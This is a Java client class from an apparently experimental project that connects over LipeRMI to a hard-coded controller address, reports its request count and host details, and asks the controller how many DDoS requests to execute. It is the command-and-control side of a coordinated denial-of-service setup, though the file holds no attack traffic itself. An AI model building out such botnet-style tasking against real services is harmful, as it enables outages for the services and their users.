/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.example.senura.lipermitest1;

import java.io.IOException;
import net.sf.lipermi.handler.CallHandler;
import net.sf.lipermi.net.Client;

/**
 *
 * @author senura
 */
public class ClientControllerCon {
    
    private static TestServiceController remoteObject=null;
    
    private static int myGETCount=0;
    private static String myIP="";
    private static String hostName="";
   
    
    public static boolean start(){
    return setClient();
    }
    
    
       private static boolean setClient(){
        
        boolean isServerCameOnline=false;
           
        CallHandler callHandler = new CallHandler();
        String remoteHost = "172.20.8.65";//"192.168.1.4";
        int portWasBinded = 58883;
        
        Client client=null;
       
        try {
            client = new Client(remoteHost, portWasBinded, callHandler);
            isServerCameOnline=true;
        } catch (IOException ex) {
            System.out.println("Controller is not online");
        }
        
        
        if(client!=null){
        remoteObject =
                (TestServiceController) client.getGlobal(TestServiceController.class);
        
        System.out.println(remoteObject.getResponse("hi"));
        
        if(myGETCount!=0 && !myIP.equals("") && !hostName.equals(""))
            remoteObject.setDDOSCount(myGETCount,myIP,hostName);
        
        }
        return isServerCameOnline;
       }
       
       
       
        public static int takeNumOfDDOSToBeExcecuted(){
           int ddosNos=0;
           
           if(remoteObject.isProposedDDOSCountSet()){
           ddosNos=remoteObject.getNumofDDOSToBeExcecuted(myIP);
           
            System.out.println(" takeNumOfDDOSToBeExcecuted returned = "+ddosNos);
            
            
            if(myGETCount>ddosNos)
                   System.out.println("Provided ddos count is lower, thus");
            
           }
           
           return ddosNos;
       }
       
       
       
       public static void setControllerVar(int count, String ip, String HName){
       myGETCount=count;
       myIP=ip;
       hostName=HName;
       }
    
    
       
    
}
